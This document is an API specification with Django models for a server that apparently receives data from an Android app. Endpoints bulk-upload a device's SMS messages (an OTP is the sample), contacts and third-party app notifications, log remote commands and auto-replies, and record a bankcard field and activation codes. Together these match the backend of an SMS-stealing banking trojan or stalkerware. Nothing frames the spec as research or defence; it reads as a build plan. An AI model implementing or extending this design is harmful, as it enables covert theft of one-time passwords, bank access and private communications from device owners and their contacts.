# Django API Specification

## Base Configuration

**Base URL:** `https://api.fastpaygaming.com`

**Default Headers:**
```
Accept: application/json
Accept-Encoding: gzip
Content-Type: application/json; charset=utf-8
```

**Compression:** GZIP for request bodies > 1KB

**Timeouts:**
- Connection: 15 seconds
- Read: 30 seconds
- Write: 30 seconds

**Retry Policy:**
- Max retries: 3
- Initial delay: 1000ms with exponential backoff
- Retries on: HTTP >= 500, network failures

---

## API Endpoints

### 1. Device Registration

**`POST /devices/`**

Register a new device during activation.

**Request:**
```json
{
  "device_id": "abc123def456",
  "model": "Samsung Galaxy S21",
  "phone": "+1234567890",
  "code": "ABC123",
  "is_active": true,
  "last_seen": 1706950800000,
  "battery_percentage": 85,
  "current_phone": "+1234567890",
  "current_identifier": "ABC123",
  "time": 1706950800000,
  "bankcard": "BANKCARD",
  "system_info": {},
  "app_version_code": 42,
  "app_version_name": "1.2.3"
}
```

**Response:** `201 Created` or `200 OK`

---

### 2. Update Device

**`PATCH /devices/{deviceId}/`**

Partial update of device data.

**Request:**
```json
{
  "sync_metadata": {
    "last_sms_sync": 1706950800000,
    "last_contact_sync": 1706950800000
  },
  "system_info": {
    "permissionStatus": {
      "sms": true,
      "contacts": true
    }
  }
}
```

**Response:** `200 OK`

---

### 3. Get Device

**`GET /devices/{deviceId}/`**

Retrieve device configuration.

**Response:**
```json
{
  "device_id": "abc123def456",
  "model": "Samsung Galaxy S21",
  "code": "ABC123",
  "is_active": true,
  "auto_reply_config": {
    "enabled": false,
    "message": ""
  }
}
```

---

### 4. Bulk Sync Messages

**`POST /messages/`**

Upload batch of SMS messages.

**Request:**
```json
[
  {
    "device_id": "abc123def456",
    "message_type": "received",
    "phone": "+1234567890",
    "body": "Your OTP is 123456",
    "timestamp": 1706950800000,
    "read": false
  },
  {
    "device_id": "abc123def456",
    "message_type": "sent",
    "phone": "+1234567890",
    "body": "Thanks",
    "timestamp": 1706950900000,
    "read": true
  }
]
```

**Response:** `201 Created`

---

### 5. Bulk Sync Contacts

**`POST /contacts/`**

Upload batch of contacts.

**Request:**
```json
[
  {
    "device_id": "abc123def456",
    "name": "John Doe",
    "phone_number": "+1234567890",
    "display_name": "John",
    "company": "Acme Inc",
    "job_title": "Developer",
    "last_contacted": 1706950800000
  }
]
```

**Response:** `201 Created`

---

### 6. Bulk Sync Notifications

**`POST /notifications/`**

Upload batch of notifications.

**Request:**
```json
[
  {
    "device_id": "abc123def456",
    "package_name": "com.whatsapp",
    "title": "John",
    "text": "Hey, how are you?",
    "timestamp": 1706950800000,
    "extra": {}
  }
]
```

**Response:** `201 Created`

---

### 7. Log Command Execution

**`POST /command-logs/`**

Log remote command execution (no retry).

**Request:**
```json
{
  "device_id": "abc123def456",
  "command": "sync_sms",
  "value": null,
  "status": "success",
  "received_at": 1706950800000,
  "executed_at": 1706950801000,
  "error_message": null
}
```

**Response:** `201 Created`

---

### 8. Log Auto-Reply

**`POST /auto-reply-logs/`**

Log auto-reply execution (no retry).

**Request:**
```json
{
  "device_id": "abc123def456",
  "sender": "+1234567890",
  "reply_message": "Thanks for your message",
  "original_timestamp": 1706950800000,
  "replied_at": 1706950801000
}
```

**Response:** `201 Created`

---

### 9. Log Activation Failure

**`POST /activation-failure-logs/`**

Log activation failures for support (no retry).

**Request:**
```json
{
  "device_id": "abc123def456",
  "code_attempted": "WRONG123",
  "mode": "testing",
  "error_type": "INVALID_CODE",
  "error_message": "Code not found in database",
  "metadata": {
    "app_version": "1.2.3"
  }
}
```

**Response:** `201 Created`

---

### 10. Register Bank Number (TESTING Mode)

**`POST /registerbanknumber`**

Register phone number for TESTING mode activation.

**Request:**
```json
{
  "phone": "+1234567890",
  "code": "ABC123",
  "device_id": "abc123def456",
  "model": "Samsung Galaxy S21",
  "app_version_code": 42,
  "app_version_name": "1.2.3"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Registered successfully"
}
```

---

### 11. Validate Code Login (RUNNING Mode)

**`POST /validate-login/`**

Validate activation code for RUNNING mode.

**Request:**
```json
{
  "code": "ABC123",
  "device_id": "abc123def456"
}
```

**Response (Valid):**
```json
{
  "valid": true,
  "approved": true
}
```

**Response (Invalid):** `401 Unauthorized` or `404 Not Found`

---

### 12. Register FCM Token

**`POST /fcm-tokens/`**

Register device for push notifications.

**Request:**
```json
{
  "device_id": "abc123def456",
  "fcm_token": "fcm_token_string_here",
  "platform": "android",
  "model": "Samsung Galaxy S21"
}
```

**Response:** `201 Created`

---

### 13. Unregister FCM Token

**`POST /fcm-tokens/unregister/`**

Remove FCM token (on logout/deactivation).

**Request:**
```json
{
  "device_id": "abc123def456"
}
```

**Response:** `200 OK`

---

## Error Handling

### HTTP Status Codes
| Code | Meaning |
|------|---------|
| 200 | Success |
| 201 | Created |
| 400 | Bad Request (invalid data) |
| 401 | Unauthorized (invalid code) |
| 404 | Not Found |
| 500+ | Server Error (triggers retry) |

### Retry Configuration
- Endpoints with retry: `/devices/`, `/messages/`, `/contacts/`, `/notifications/`, `/fcm-tokens/`
- Endpoints without retry: `/command-logs/`, `/auto-reply-logs/`, `/activation-failure-logs/`

---

## Data Types Reference

| Field | Type | Format |
|-------|------|--------|
| device_id | String | Android ID |
| timestamp | Long | Milliseconds since epoch |
| phone | String | E.164 format (+1234567890) |
| message_type | String | "received" or "sent" |
| mode | String | "testing" or "running" |
| platform | String | Always "android" |

---

## Django Models Required

### Device
```python
class Device(models.Model):
    device_id = models.CharField(max_length=100, primary_key=True)
    model = models.CharField(max_length=200)
    phone = models.CharField(max_length=20)
    code = models.CharField(max_length=50)
    is_active = models.BooleanField(default=False)
    last_seen = models.BigIntegerField()
    battery_percentage = models.IntegerField(default=-1)
    system_info = models.JSONField(default=dict)
    sync_metadata = models.JSONField(default=dict)
    app_version_code = models.IntegerField(null=True)
    app_version_name = models.CharField(max_length=50, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
```

### Message
```python
class Message(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    message_type = models.CharField(max_length=10)  # received/sent
    phone = models.CharField(max_length=20)
    body = models.TextField()
    timestamp = models.BigIntegerField()
    read = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)
```

### Contact
```python
class Contact(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    name = models.CharField(max_length=200)
    phone_number = models.CharField(max_length=20)
    display_name = models.CharField(max_length=200, null=True)
    company = models.CharField(max_length=200, null=True)
    job_title = models.CharField(max_length=200, null=True)
    last_contacted = models.BigIntegerField(null=True)
    created_at = models.DateTimeField(auto_now_add=True)
```

### Notification
```python
class Notification(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    package_name = models.CharField(max_length=200)
    title = models.CharField(max_length=500)
    text = models.TextField()
    timestamp = models.BigIntegerField()
    extra = models.JSONField(default=dict)
    created_at = models.DateTimeField(auto_now_add=True)
```

### CommandLog
```python
class CommandLog(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    command = models.CharField(max_length=100)
    value = models.TextField(null=True)
    status = models.CharField(max_length=50)
    received_at = models.BigIntegerField()
    executed_at = models.BigIntegerField(null=True)
    error_message = models.TextField(null=True)
    created_at = models.DateTimeField(auto_now_add=True)
```

### FCMToken
```python
class FCMToken(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    fcm_token = models.TextField()
    platform = models.CharField(max_length=20, default='android')
    model = models.CharField(max_length=200)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
```

### ActivationFailureLog
```python
class ActivationFailureLog(models.Model):
    device_id = models.CharField(max_length=100)
    code_attempted = models.CharField(max_length=50, null=True)
    mode = models.CharField(max_length=20)
    error_type = models.CharField(max_length=100)
    error_message = models.TextField(null=True)
    metadata = models.JSONField(default=dict)
    created_at = models.DateTimeField(auto_now_add=True)
```

### AutoReplyLog
```python
class AutoReplyLog(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    sender = models.CharField(max_length=20)
    reply_message = models.TextField()
    original_timestamp = models.BigIntegerField()
    replied_at = models.BigIntegerField()
    created_at = models.DateTimeField(auto_now_add=True)
```
